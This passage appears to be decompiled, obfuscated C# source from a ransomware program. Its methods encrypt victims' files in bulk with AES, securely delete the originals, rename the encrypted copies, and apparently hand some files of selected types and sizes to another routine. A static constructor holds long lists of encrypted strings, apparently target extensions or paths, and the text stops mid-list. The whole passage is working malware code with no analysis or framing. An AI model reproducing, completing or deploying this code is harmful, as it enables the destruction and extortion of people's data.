										kJPieacjYGSQl(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt, CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt, cIuCDrbwXuOW);
									}
									else
									{
										kJPieacjYGSQl(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt, CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex8)
								{
									if (WUCUbinjeq)
									{
										try
										{
											File.AppendAllText(YPtXSOBdFjEyjx, TxvmYnegcEEXP.getString_0(107116801) + CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt + TxvmYnegcEEXP.getString_0(107117057) + ex8.Message + TxvmYnegcEEXP.getString_0(107396273));
										}
										catch (Exception)
										{
										}
									}
									uKBVRzIpOhGoBvvo++;
									return;
								}
							}
							if (kzxgomJEqSw)
							{
								if (CS_0024_003C_003E8__locals0.smwDoAVKEY != TxvmYnegcEEXP.getString_0(107117071))
								{
									cSThTETOguBcBoOS(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt + CS_0024_003C_003E8__locals0.smwDoAVKEY, bytes2);
								}
								else
								{
									cSThTETOguBcBoOS(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt, bytes2);
								}
							}
						}
						end_IL_0656_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_0d56;
			IL_0d56:
			CS_0024_003C_003E8__locals0.NkwuoikPHxefPg.Remove(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt);
		});
	}

	private static void dTKSKVKPkMuy(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (pAvlEUMGUOUVcdb == getString_0(107396909))
					{
						foreach (string item in RrzUCivKfrsaJ)
						{
							if (string_0.ToLower().EndsWith(item) && ARdYTzaLyCQej == getString_0(107396909))
							{
								if (Convert.ToInt32(zxDCvygXmLZs) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										GtRYKNkRmbf.WWRIlNqXKavKj(getString_0(107089448), getString_0(107089443), getString_0(107089398), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && ARdYTzaLyCQej == getString_0(107396882))
							{
								try
								{
									GtRYKNkRmbf.WWRIlNqXKavKj(getString_0(107089448), getString_0(107089443), getString_0(107089398), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107117048)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107117048), getString_0(107087972)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void kJPieacjYGSQl(string string_0, string string_1, byte[] byte_0)
	{
		if (string_0 != string_1)
		{
			File.Move(string_0, string_1);
			string_0 = string_1;
		}
		if (pAvlEUMGUOUVcdb == getString_0(107396909))
		{
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			foreach (string item in RrzUCivKfrsaJ)
			{
				if (string_0.ToLower().EndsWith(item) && ARdYTzaLyCQej == getString_0(107396909))
				{
					if (Convert.ToInt32(zxDCvygXmLZs) * 1024 * 1024 > fileStream.Length)
					{
						try
						{
							GtRYKNkRmbf.WWRIlNqXKavKj(getString_0(107089448), getString_0(107089443), getString_0(107089398), string_0);
						}
						catch
						{
						}
					}
				}
				else if (string_0.ToLower().EndsWith(item) && ARdYTzaLyCQej == getString_0(107396882))
				{
					try
					{
						GtRYKNkRmbf.WWRIlNqXKavKj(getString_0(107089448), getString_0(107089443), getString_0(107089398), string_0);
					}
					catch
					{
					}
				}
			}
			fileStream.Dispose();
		}
		byte[] bytes = lvPnQGmwQvcsCNgQ.RRycjAChOoCA(File.ReadAllBytes(string_0), byte_0, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(string_0, bytes);
		jTlplcaVkMbxzj++;
	}

	private static void NvWUfuaAWdwvhRC(string string_0, string string_1, byte[] byte_0)
	{
		RVSIuUiBsAhsn CS_0024_003C_003E8__locals0 = new RVSIuUiBsAhsn();
		CS_0024_003C_003E8__locals0.djYlbnwPOQOIhSe = string_0;
		CS_0024_003C_003E8__locals0.sfUoAYwnvaf = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string sfUoAYwnvaf = CS_0024_003C_003E8__locals0.sfUoAYwnvaf;
			FileStream fileStream = new FileStream(sfUoAYwnvaf, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (uneEoMuaKwN == getString_0(107396909))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.djYlbnwPOQOIhSe, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.djYlbnwPOQOIhSe, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.djYlbnwPOQOIhSe, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.sfUoAYwnvaf.Length > 0)
				{
					if (pAvlEUMGUOUVcdb == getString_0(107396909))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.djYlbnwPOQOIhSe, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in RrzUCivKfrsaJ)
						{
							if (CS_0024_003C_003E8__locals0.djYlbnwPOQOIhSe.ToLower().EndsWith(item) && ARdYTzaLyCQej == getString_0(107396909))
							{
								if (Convert.ToInt32(zxDCvygXmLZs) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										GtRYKNkRmbf.WWRIlNqXKavKj(getString_0(107089448), getString_0(107089443), getString_0(107089398), CS_0024_003C_003E8__locals0.djYlbnwPOQOIhSe);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.djYlbnwPOQOIhSe.ToLower().EndsWith(item) && ARdYTzaLyCQej == getString_0(107396882))
							{
								try
								{
									GtRYKNkRmbf.WWRIlNqXKavKj(getString_0(107089448), getString_0(107089443), getString_0(107089398), CS_0024_003C_003E8__locals0.djYlbnwPOQOIhSe);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.djYlbnwPOQOIhSe);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.sfUoAYwnvaf.EndsWith(getString_0(107117048)))
					{
						File.Move(CS_0024_003C_003E8__locals0.sfUoAYwnvaf, CS_0024_003C_003E8__locals0.sfUoAYwnvaf.Replace(getString_0(107117048), getString_0(107087972)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.sfUoAYwnvaf))
							{
								File.Delete(CS_0024_003C_003E8__locals0.sfUoAYwnvaf);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (WUCUbinjeq)
			{
				try
				{
					File.AppendAllText(YPtXSOBdFjEyjx, getString_0(107116783) + CS_0024_003C_003E8__locals0.djYlbnwPOQOIhSe + getString_0(107117039) + ex2.Message + getString_0(107396255));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__6()
	{
		List<string> source = sYnLtmziONN;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
			{
				DndsNVaSUbaYiXt(getString_0(107116986), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		List<string> sjGhNlRInFwl = SjGhNlRInFwl;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
			{
				DndsNVaSUbaYiXt(getString_0(107087116), string_0);
			};
		}
		Parallel.ForEach(sjGhNlRInFwl, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
		List<string> source2 = uFPbcFlZmuJ;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
			{
				DndsNVaSUbaYiXt(ZszvXPTYjBtgjF(getString_0(107116977)), string_0);
			};
		}
		Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
		if (quhmMiARDLmR == getString_0(107396909))
		{
			string[] yFhYUCNshEdDAX = YFhYUCNshEdDAX;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
				{
					DndsNVaSUbaYiXt(ZszvXPTYjBtgjF(getString_0(107116977)), getString_0(107116952) + string_0 + getString_0(107116943));
				};
			}
			Parallel.ForEach(yFhYUCNshEdDAX, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
		}
		if (!aDRTZBCTUt().Contains(getString_0(107116681)))
		{
			KoKFpIzICEddc(UGGmKsnoSN);
		}
		else
		{
			List<string> source3 = tUzzZAFebr;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
				{
					DndsNVaSUbaYiXt(ZszvXPTYjBtgjF(DqooNRqZwbOam(getString_0(107116970))), string_0);
				};
			}
			Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
		}
		List<string> zOubOFvdOxx = ZOubOFvdOxx;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
			{
				DndsNVaSUbaYiXt(ZszvXPTYjBtgjF(getString_0(107116913)), string_0);
			};
		}
		Parallel.ForEach(zOubOFvdOxx, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
		List<string> source4 = nhZDyaCRzSAZ;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 = delegate(string string_0)
			{
				DndsNVaSUbaYiXt(getString_0(107116928), string_0);
			};
		}
		Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate17);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		DndsNVaSUbaYiXt(getString_0(107116986), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		DndsNVaSUbaYiXt(getString_0(107087116), string_0);
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		DndsNVaSUbaYiXt(ZszvXPTYjBtgjF(getString_0(107116977)), string_0);
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		DndsNVaSUbaYiXt(ZszvXPTYjBtgjF(getString_0(107116977)), getString_0(107116952) + string_0 + getString_0(107116943));
	}

	private static void _003CMain_003Eb__b(string string_0)
	{
		DndsNVaSUbaYiXt(ZszvXPTYjBtgjF(DqooNRqZwbOam(getString_0(107116970))), string_0);
	}

	private static void _003CMain_003Eb__c(string string_0)
	{
		DndsNVaSUbaYiXt(ZszvXPTYjBtgjF(getString_0(107116913)), string_0);
	}

	private static void _003CMain_003Eb__d(string string_0)
	{
		DndsNVaSUbaYiXt(getString_0(107116928), string_0);
	}

	static hiKoLLubGHH()
	{
		Strings.CreateGetStringDelegate(typeof(hiKoLLubGHH));
		DGMvhADQDhvvHBvW = getString_0(107088766);
		cIuCDrbwXuOW = null;
		OAyGmagMWpgoWAJCw = getString_0(107396882);
		pDpPfpDBIveZcfZ = getString_0(107116375);
		JPTwqHSqmQofk = new List<string>();
		DlCUXajEIVUCD = new List<string>();
		hWnwAmiBXnIpxX = getString_0(107396882);
		zlRieKkFzeh = getString_0(107087972);
		gEeUOBrkGDECGn = getString_0(107087972);
		KeylInOxQw = getString_0(107396882);
		fEVfCvbcNeE = 0;
		gZQfvzYpbFm = getString_0(107396909);
		sMWMPoSokZO = getString_0(107396882);
		HHYGaIuvqXbdu = getString_0(107396882);
		vYiyrVaAwx = getString_0(107116394);
		XZFGoOEkpQ = getString_0(107396882);
		lrADaDyiQGKc = getString_0(107396882);
		OzLZXBnRLVtJ = getString_0(107396882);
		PDmRqfuJsMB = getString_0(107396909);
		aMmMDWbjtqwOY = new List<string>
		{
			ZszvXPTYjBtgjF(getString_0(107116389)),
			ZszvXPTYjBtgjF(getString_0(107116340)),
			ZszvXPTYjBtgjF(getString_0(107116315)),
			ZszvXPTYjBtgjF(getString_0(107116330)),
			ZszvXPTYjBtgjF(getString_0(107116273)),
			ZszvXPTYjBtgjF(getString_0(107116248)),
			ZszvXPTYjBtgjF(getString_0(107116263)),
			ZszvXPTYjBtgjF(getString_0(107116238)),
			ZszvXPTYjBtgjF(getString_0(107116181)),
			ZszvXPTYjBtgjF(getString_0(107116156)),
			ZszvXPTYjBtgjF(getString_0(107116171)),
			ZszvXPTYjBtgjF(getString_0(107116626)),
			ZszvXPTYjBtgjF(getString_0(107116601))
		};
		LJCJcQbJapSHJR = new List<string>();
		UjgMaWYCjvGuF = getString_0(107396909);
		votUdSXTMDqkx = getString_0(107396882);
		uuYpwOryzxx = getString_0(107396882);
		iqVERQUhagNsiaC = new List<string>();
		OSuDMxmnRmH = getString_0(107396882);
		mErkSlRuQmtdivX = getString_0(107116608);
		HjogaXQARCSKCJ = getString_0(107396909);
		TADhPTGUCTGsb = getString_0(107396882);
		SjGhNlRInFwl = new List<string>
		{
			ZszvXPTYjBtgjF(getString_0(107116527)),
			ZszvXPTYjBtgjF(getString_0(107116526)),
			ZszvXPTYjBtgjF(getString_0(107116493)),
			ZszvXPTYjBtgjF(getString_0(107116460)),
			ZszvXPTYjBtgjF(getString_0(107116427)),
			ZszvXPTYjBtgjF(getString_0(107115886)),
			ZszvXPTYjBtgjF(getString_0(107115797)),
			ZszvXPTYjBtgjF(getString_0(107115768)),
			ZszvXPTYjBtgjF(getString_0(107115755)),
			ZszvXPTYjBtgjF(getString_0(107115690)),
			ZszvXPTYjBtgjF(getString_0(107115657)),
			ZszvXPTYjBtgjF(getString_0(107116136)),
			ZszvXPTYjBtgjF(getString_0(107116103)),
			ZszvXPTYjBtgjF(getString_0(107116074)),
			ZszvXPTYjBtgjF(getString_0(107116045)),
			ZszvXPTYjBtgjF(getString_0(107116004)),
			ZszvXPTYjBtgjF(getString_0(107115931)),
			ZszvXPTYjBtgjF(getString_0(107115906)),
			ZszvXPTYjBtgjF(getString_0(107115313)),
			ZszvXPTYjBtgjF(getString_0(107115280)),
			ZszvXPTYjBtgjF(getString_0(107115251)),
			ZszvXPTYjBtgjF(getString_0(107115242)),
			ZszvXPTYjBtgjF(getString_0(107115201)),
			ZszvXPTYjBtgjF(getString_0(107115168)),
			ZszvXPTYjBtgjF(getString_0(107115599)),
			ZszvXPTYjBtgjF(getString_0(107115542)),
			ZszvXPTYjBtgjF(getString_0(107115533)),
			ZszvXPTYjBtgjF(getString_0(107115472)),
			ZszvXPTYjBtgjF(getString_0(107115463)),
			ZszvXPTYjBtgjF(getString_0(107115406)),
			ZszvXPTYjBtgjF(getString_0(107114829)),
			ZszvXPTYjBtgjF(getString_0(107114740)),
			ZszvXPTYjBtgjF(getString_0(107114675)),
			ZszvXPTYjBtgjF(getString_0(107114658)),
			ZszvXPTYjBtgjF(getString_0(107115105)),
			ZszvXPTYjBtgjF(getString_0(107115048)),
			ZszvXPTYjBtgjF(getString_0(107115015)),
			ZszvXPTYjBtgjF(getString_0(107114942)),
			ZszvXPTYjBtgjF(getString_0(107114901)),
			ZszvXPTYjBtgjF(getString_0(107114888)),
			ZszvXPTYjBtgjF(getString_0(107114347)),
			ZszvXPTYjBtgjF(getString_0(107114282)),
			ZszvXPTYjBtgjF(getString_0(107114241)),
			ZszvXPTYjBtgjF(getString_0(107114208)),
			ZszvXPTYjBtgjF(getString_0(107114135)),
			ZszvXPTYjBtgjF(getString_0(107114118)),
			ZszvXPTYjBtgjF(getString_0(107114553)),
			ZszvXPTYjBtgjF(getString_0(107114480)),
			ZszvXPTYjBtgjF(getString_0(107114467)),
			ZszvXPTYjBtgjF(getString_0(107114390)),
			ZszvXPTYjBtgjF(getString_0(107114377)),
			ZszvXPTYjBtgjF(getString_0(107113824)),
			ZszvXPTYjBtgjF(getString_0(107113719)),
			ZszvXPTYjBtgjF(getString_0(107113690)),
			ZszvXPTYjBtgjF(getString_0(107113649)),
			ZszvXPTYjBtgjF(getString_0(107113584)),
			ZszvXPTYjBtgjF(getString_0(107114083)),
			ZszvXPTYjBtgjF(getString_0(107114054)),
			ZszvXPTYjBtgjF(getString_0(107113977)),
			ZszvXPTYjBtgjF(getString_0(107113912)),
			ZszvXPTYjBtgjF(getString_0(107113883)),
			ZszvXPTYjBtgjF(getString_0(107113858)),
			ZszvXPTYjBtgjF(getString_0(107113281)),
			ZszvXPTYjBtgjF(getString_0(107113208)),
			ZszvXPTYjBtgjF(getString_0(107113179)),
			ZszvXPTYjBtgjF(getString_0(107113138)),
			ZszvXPTYjBtgjF(getString_0(107113089)),
			ZszvXPTYjBtgjF(getString_0(107113540)),
			ZszvXPTYjBtgjF(getString_0(107113435)),
			ZszvXPTYjBtgjF(getString_0(107113422)),
			ZszvXPTYjBtgjF(getString_0(107113389)),
			ZszvXPTYjBtgjF(getString_0(107113348)),
			ZszvXPTYjBtgjF(getString_0(107112727)),
			ZszvXPTYjBtgjF(getString_0(107112714)),
			ZszvXPTYjBtgjF(getString_0(107112593)),
			ZszvXPTYjBtgjF(getString_0(107112576)),
			ZszvXPTYjBtgjF(getString_0(107113059)),
			ZszvXPTYjBtgjF(getString_0(107112986)),
			ZszvXPTYjBtgjF(getString_0(107112921)),
			ZszvXPTYjBtgjF(getString_0(107112904)),
			ZszvXPTYjBtgjF(getString_0(107112815)),
			ZszvXPTYjBtgjF(getString_0(107112302)),
			ZszvXPTYjBtgjF(getString_0(107112209)),
			ZszvXPTYjBtgjF(getString_0(107112152)),
			ZszvXPTYjBtgjF(getString_0(107115048)),
			ZszvXPTYjBtgjF(getString_0(107112127)),
			ZszvXPTYjBtgjF(getString_0(107112054)),
			ZszvXPTYjBtgjF(getString_0(107112477)),
			ZszvXPTYjBtgjF(getString_0(107112432)),
			ZszvXPTYjBtgjF(getString_0(107112371)),
			ZszvXPTYjBtgjF(getString_0(107112346)),
			ZszvXPTYjBtgjF(getString_0(107112333)),
			ZszvXPTYjBtgjF(getString_0(107111740)),
			ZszvXPTYjBtgjF(getString_0(107115406)),
			ZszvXPTYjBtgjF(getString_0(107111675)),
			ZszvXPTYjBtgjF(getString_0(107111634)),
			ZszvXPTYjBtgjF(getString_0(107111577)),
			ZszvXPTYjBtgjF(getString_0(107114829)),
			ZszvXPTYjBtgjF(getString_0(107112016)),
			ZszvXPTYjBtgjF(getString_0(107111999)),
			ZszvXPTYjBtgjF(getString_0(107111910)),
			ZszvXPTYjBtgjF(getString_0(107111845)),
			ZszvXPTYjBtgjF(getString_0(107111252)),
			ZszvXPTYjBtgjF(getString_0(107114675)),
			ZszvXPTYjBtgjF(getString_0(107111207)),
			ZszvXPTYjBtgjF(getString_0(107115015)),
			ZszvXPTYjBtgjF(getString_0(107114658)),
			ZszvXPTYjBtgjF(getString_0(107111174)),
			ZszvXPTYjBtgjF(getString_0(107111117)),
			ZszvXPTYjBtgjF(getString_0(107115105)),
			ZszvXPTYjBtgjF(getString_0(107111084)),
			ZszvXPTYjBtgjF(getString_0(107111515)),
			ZszvXPTYjBtgjF(getString_0(107111498)),
			ZszvXPTYjBtgjF(getString_0(107115463)),
			ZszvXPTYjBtgjF(getString_0(107111441)),
			ZszvXPTYjBtgjF(getString_0(107111428)),
			ZszvXPTYjBtgjF(getString_0(107111399)),
			ZszvXPTYjBtgjF(getString_0(107111370)),
			ZszvXPTYjBtgjF(getString_0(107111293)),
			ZszvXPTYjBtgjF(getString_0(107110748)),
			ZszvXPTYjBtgjF(getString_0(107110755)),
			ZszvXPTYjBtgjF(getString_0(107110678)),
			ZszvXPTYjBtgjF(getString_0(107110653)),
			ZszvXPTYjBtgjF(getString_0(107110612)),
			ZszvXPTYjBtgjF(getString_0(107110599)),
			ZszvXPTYjBtgjF(getString_0(107110518)),
			ZszvXPTYjBtgjF(getString_0(107110973)),
			ZszvXPTYjBtgjF(getString_0(107110940)),
			ZszvXPTYjBtgjF(getString_0(107110895)),
			ZszvXPTYjBtgjF(getString_0(107110894)),
			ZszvXPTYjBtgjF(getString_0(107110853)),
			ZszvXPTYjBtgjF(getString_0(107115472)),
			ZszvXPTYjBtgjF(getString_0(107110518)),
			ZszvXPTYjBtgjF(getString_0(107110780)),
			ZszvXPTYjBtgjF(getString_0(107110783)),
			ZszvXPTYjBtgjF(getString_0(107110242)),
			ZszvXPTYjBtgjF(getString_0(107110161)),
			ZszvXPTYjBtgjF(getString_0(107110152)),
			ZszvXPTYjBtgjF(getString_0(107110091)),
			ZszvXPTYjBtgjF(getString_0(107110018)),
			ZszvXPTYjBtgjF(getString_0(107110501)),
			ZszvXPTYjBtgjF(getString_0(107110468)),
			ZszvXPTYjBtgjF(getString_0(107110363)),
			ZszvXPTYjBtgjF(getString_0(107110334)),
			ZszvXPTYjBtgjF(getString_0(107110289)),
			ZszvXPTYjBtgjF(getString_0(107109712)),
			ZszvXPTYjBtgjF(getString_0(107109679)),
			ZszvXPTYjBtgjF(getString_0(107109666)),
			ZszvXPTYjBtgjF(getString_0(107109605)),
			ZszvXPTYjBtgjF(getString_0(107109572)),
			ZszvXPTYjBtgjF(getString_0(107109495)),
			ZszvXPTYjBtgjF(getString_0(107109942)),
			ZszvXPTYjBtgjF(getString_0(107109909)),
			ZszvXPTYjBtgjF(getString_0(107109900)),
			ZszvXPTYjBtgjF(getString_0(107109819)),
			ZszvXPTYjBtgjF(getString_0(107115599)),
			ZszvXPTYjBtgjF(getString_0(107109790)),
			ZszvXPTYjBtgjF(getString_0(107109765)),
			ZszvXPTYjBtgjF(getString_0(107109180)),
			ZszvXPTYjBtgjF(getString_0(107109135)),
			ZszvXPTYjBtgjF(getString_0(107109126)),
			ZszvXPTYjBtgjF(getString_0(107109049)),
			ZszvXPTYjBtgjF(getString_0(107108988)),
			ZszvXPTYjBtgjF(getString_0(107109483)),
			ZszvXPTYjBtgjF(getString_0(107109402)),
			ZszvXPTYjBtgjF(getString_0(107109377)),
			ZszvXPTYjBtgjF(getString_0(107109320)),
			ZszvXPTYjBtgjF(getString_0(107109243)),
			ZszvXPTYjBtgjF(getString_0(107108690)),
			ZszvXPTYjBtgjF(getString_0(107108633)),
			ZszvXPTYjBtgjF(getString_0(107115542)),
			ZszvXPTYjBtgjF(getString_0(107108560)),
			ZszvXPTYjBtgjF(getString_0(107108531)),
			ZszvXPTYjBtgjF(getString_0(107108498)),
			ZszvXPTYjBtgjF(getString_0(107108489)),
			ZszvXPTYjBtgjF(getString_0(107108972)),
			ZszvXPTYjBtgjF(getString_0(107115168)),
			ZszvXPTYjBtgjF(getString_0(107108931)),
			ZszvXPTYjBtgjF(getString_0(107108850)),
			ZszvXPTYjBtgjF(getString_0(107108821)),
			ZszvXPTYjBtgjF(getString_0(107113883)),
			ZszvXPTYjBtgjF(getString_0(107108788)),
			ZszvXPTYjBtgjF(getString_0(107108821)),
			ZszvXPTYjBtgjF(getString_0(107108759)),
			ZszvXPTYjBtgjF(getString_0(107108730)),
			ZszvXPTYjBtgjF(getString_0(107108189)),
			ZszvXPTYjBtgjF(getString_0(107108172)),
			ZszvXPTYjBtgjF(getString_0(107108091)),
			ZszvXPTYjBtgjF(getString_0(107108050)),
			ZszvXPTYjBtgjF(getString_0(107107989)),
			ZszvXPTYjBtgjF(getString_0(107107960)),
			ZszvXPTYjBtgjF(getString_0(107108431)),
			ZszvXPTYjBtgjF(getString_0(107108418)),
			ZszvXPTYjBtgjF(getString_0(107108341)),
			ZszvXPTYjBtgjF(getString_0(107108308)),
			ZszvXPTYjBtgjF(getString_0(107108251)),
			ZszvXPTYjBtgjF(getString_0(107108238)),
			ZszvXPTYjBtgjF(getString_0(107107637)),
			ZszvXPTYjBtgjF(getString_0(107107604)),
			ZszvXPTYjBtgjF(getString_0(107107595)),
			ZszvXPTYjBtgjF(getString_0(107107566)),
			ZszvXPTYjBtgjF(getString_0(107107473)),
			ZszvXPTYjBtgjF(getString_0(107107440)),
			ZszvXPTYjBtgjF(getString_0(107107895)),
			ZszvXPTYjBtgjF(getString_0(107107886)),
			ZszvXPTYjBtgjF(getString_0(107107805)),
			ZszvXPTYjBtgjF(getString_0(107107772)),
			ZszvXPTYjBtgjF(getString_0(107107755)),
			ZszvXPTYjBtgjF(getString_0(107107166)),
			ZszvXPTYjBtgjF(getString_0(107107149)),
			ZszvXPTYjBtgjF(getString_0(107107104)),
			ZszvXPTYjBtgjF(getString_0(107107023)),
			ZszvXPTYjBtgjF(getString_0(107107022)),
			ZszvXPTYjBtgjF(getString_0(107106981)),
			ZszvXPTYjBtgjF(getString_0(107107420)),
			ZszvXPTYjBtgjF(getString_0(107107375)),
			ZszvXPTYjBtgjF(getString_0(107110152)),
			ZszvXPTYjBtgjF(getString_0(107107374)),
			ZszvXPTYjBtgjF(getString_0(107107333)),
			ZszvXPTYjBtgjF(getString_0(107107276)),
			ZszvXPTYjBtgjF(getString_0(107107215)),
			ZszvXPTYjBtgjF(getString_0(107107214)),
			ZszvXPTYjBtgjF(getString_0(107106669)),
			ZszvXPTYjBtgjF(getString_0(107106588)),
			ZszvXPTYjBtgjF(getString_0(107106591)),
			ZszvXPTYjBtgjF(getString_0(107106514)),
			ZszvXPTYjBtgjF(getString_0(107106501)),
			ZszvXPTYjBtgjF(getString_0(107106428)),
			ZszvXPTYjBtgjF(getString_0(107106915)),
			ZszvXPTYjBtgjF(getString_0(107106834)),
			ZszvXPTYjBtgjF(getString_0(107106805)),
			ZszvXPTYjBtgjF(getString_0(107106792))
		};
		sYnLtmziONN = new List<string>
		{
			ZszvXPTYjBtgjF(getString_0(107106751)),
			ZszvXPTYjBtgjF(getString_0(107106702)),
			ZszvXPTYjBtgjF(getString_0(107106109)),
			ZszvXPTYjBtgjF(getString_0(107106092)),
			ZszvXPTYjBtgjF(getString_0(107106011)),
			ZszvXPTYjBtgjF(getString_0(107105946)),
			ZszvXPTYjBtgjF(getString_0(107106413)),
			ZszvXPTYjBtgjF(getString_0(107106320))
		};
		uFPbcFlZmuJ = new List<string>
		{
